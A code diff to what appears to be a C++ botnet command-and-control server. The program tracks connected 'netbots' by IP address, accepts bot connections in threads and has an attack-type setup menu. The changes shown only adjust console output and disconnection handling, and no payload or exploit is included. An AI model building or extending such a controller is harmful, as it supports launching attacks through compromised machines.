@@ -104,8 +104,10 @@ void menu_header()
 }
 
 void list_bots()
-{
-	cout << "Bots connected " << "(" << netbots.size() <<"):\n";
+{	
+	system("clear");
+	menu_header();
+	cout << "\n\nBots connected " << "(" << netbots.size() <<"):\n";
 	vector<netbot>::iterator iter = netbots.begin();
 
 	for(iter; iter < netbots.end(); iter++) 
@@ -113,9 +115,10 @@ void list_bots()
 		cout << "bot: " << (*iter).ip_address << "\n";
 	}
 
-	cout << endl;
+	cout << "\nPress any key to exit...";
 
-	sleep(3);
+	cin.ignore();
+	cin.get();
 }
 
 void setup_attack_type()
@@ -181,17 +184,26 @@ void disconnection_listener(int i)
 
 		if (bytes == 0) // netbot disconnected
 		{	
+			netbot bot;
 			vector<netbot>::iterator iter = netbots.begin();
 			for(iter; iter < netbots.end(); iter++) 
 			{
 				if ((*iter).id == i) 
-				{
+				{	
+					bot = *iter;
 					netbots.erase(iter);
 					iter--;
 				}
 			}
 			
+			cout << "\nNetbot (" << bot.ip_address << ") disconnected." << std::flush;
+			
 			close(i);
+			
+			sleep(3);
+			cout << "\33[2K\r" << std::flush;
+			cout << "\x1b[A";
+						
 			return;
 		}
 	}
@@ -200,7 +212,6 @@ void disconnection_listener(int i)
 void threaded(int i)
 {
 	char buffer[1024] = { 0 };	
-	cout << "\nClient Socket File Descriptor: " << i << "\n";
 	
 	bzero(&buffer, sizeof(buffer));
 	int bytes = recv(i, buffer, 1024, 0);	
@@ -263,11 +274,11 @@ void connection_listener(int i)
 		}
 
 		netbots.push_back({ client_socket, false, inet_ntoa(client_address.sin_addr) });
-	
-		cout << "\nclient connected: " << inet_ntoa(client_address.sin_addr) << "\t Total Bots Connected: " << netbots.size() << endl;
-
+		
 		threads.push_back(thread(threaded, client_socket));
   		threads.back().detach();
+  		
+		cout << "client connected: " << inet_ntoa(client_address.sin_addr) << "\t Total Bots Connected: " << netbots.size() << endl;
 	}
 
 }
